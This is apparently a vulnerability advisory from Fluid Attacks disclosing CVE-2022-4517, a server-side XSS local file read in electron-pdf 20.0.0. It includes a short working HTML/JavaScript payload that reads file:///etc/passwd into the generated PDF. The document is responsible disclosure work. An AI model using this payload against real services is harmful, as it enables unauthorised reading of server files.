---
slug: advisories/drake/
title: electron-pdf 20.0.0 - Local File Read via Server Side XSS
authors: Carlos Bello
writer: cbello
codename: drake
product: electron-pdf 20.0.0 - Local File Read
date: 2022-12-15 12:00 COT
cveid: CVE-2022-4517
severity: 7.5
description: electron-pdf 20.0.0 - Local File Read via Server Side XSS
keywords: Fluid Attacks, Security, Vulnerabilities, Electron PDF, LFR
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | electron-pdf 20.0.0 - Local File Read                              |
| **Code name**         | [Drake](https://en.wikipedia.org/wiki/Drake_(musician))            |
| **Product**           | electron-pdf                                                       |
| **Affected versions** | Version 20.0.0                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2022-12-15                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Server Side XSS                                                                                                             |
| **Rule**              | [425. Server Side XSS](https://docs.fluidattacks.com/criteria/vulnerabilities/425)                                          |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                                                                                |
| **CVSSv3 Base Score** | 7.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-4517](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4517)                                               |

## Description

electron-pdf version 20.0.0 allows an external attacker to remotely obtain
arbitrary local files. This is possible because the application does not
validate the HTML content entered by the user.

## Vulnerability

This vulnerability occurs because the application does not validate that
the HTML content entered by the user is not malicious.

## Exploitation

To exploit this vulnerability, we only need to send the following malicious
HTML to electron-pdf:

### Exploit.html

```html
<script>
    x=new XMLHttpRequest;
    x.onload=function(){document.write(this.responseText)};
    x.open("GET","file:///etc/passwd");x.send();
</script>
```

Thus, when electron-pdf parses the malicious HTML, it will return the local file
specified in the generated PDF.

## Evidence of exploitation

![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/207912096-94ba071e-3665-4260-bbd6-5a0a1e785277.gif)

![LFR-Node-PDF](https://user-images.githubusercontent.com/51862990/207912149-6c577b56-2952-4405-91a5-1c7ab8f82456.png)

## Our security policy

We have reserved the ID CVE-2022-4517 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: electron-pdf 20.0.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.npmjs.com/package/electron-pdf/>

## Timeline

<time-lapse
  discovered="2022-12-15"
  contacted="2022-12-15"
  replied="2022-12-15"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
